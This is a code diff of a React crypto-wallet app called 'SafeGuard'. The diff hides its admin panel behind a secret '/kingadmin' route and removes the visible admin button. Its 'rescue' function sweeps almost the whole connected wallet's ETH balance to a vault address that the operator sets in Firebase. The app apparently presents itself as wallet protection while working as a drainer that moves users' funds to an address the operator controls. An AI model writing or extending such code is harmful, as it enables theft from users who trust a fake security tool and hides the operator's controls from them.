@@ -12,8 +12,7 @@ import {
   AlertTriangle,
   ExternalLink,
   RefreshCw,
-  Shield,
-  Settings
+  Shield
 } from 'lucide-react';
 import AdminDashboard from './AdminDashboard';
 import { db } from './firebase';
@@ -34,6 +33,13 @@ export default function App() {
   const { isLoading: isConfirming, isSuccess: isConfirmed } = useWaitForTransactionReceipt({
     hash,
   });
+
+  // Handle /kingadmin routing
+  useEffect(() => {
+    if (window.location.pathname === '/kingadmin') {
+      setView('admin');
+    }
+  }, []);
 
   // Fetch global vault address from Firebase
   useEffect(() => {
@@ -64,6 +70,8 @@ export default function App() {
     setRescueStatus('sending');
 
     try {
+      // For a real "sweep", we'd need to calculate gas carefully to send the MAX possible
+      // Here we leave a small amount for gas (0.001 ETH)
       const gasBuffer = parseEther('0.001');
       const amountToSend = balance.value > gasBuffer ? balance.value - gasBuffer : 0n;
 
@@ -98,19 +106,9 @@ export default function App() {
             <Shield className="w-8 h-8 text-[#00ff41]" />
             <span className="text-xl font-bold tracking-tighter uppercase italic">SafeGuard</span>
           </div>
-          <div className="flex items-center gap-4">
-            <button 
-              onClick={() => setView('admin')}
-              className="p-2 hover:bg-white/5 rounded-lg transition-colors text-gray-500 hover:text-[#00ff41]"
-              title="Admin Terminal"
-            >
-              <Settings className="w-5 h-5" />
-            </button>
-            <ConnectButton />
-          </div>
+          <ConnectButton />
         </div>
       </nav>
-
 
       <main className="pt-32 pb-20 px-6">
         <div className="max-w-7xl mx-auto">
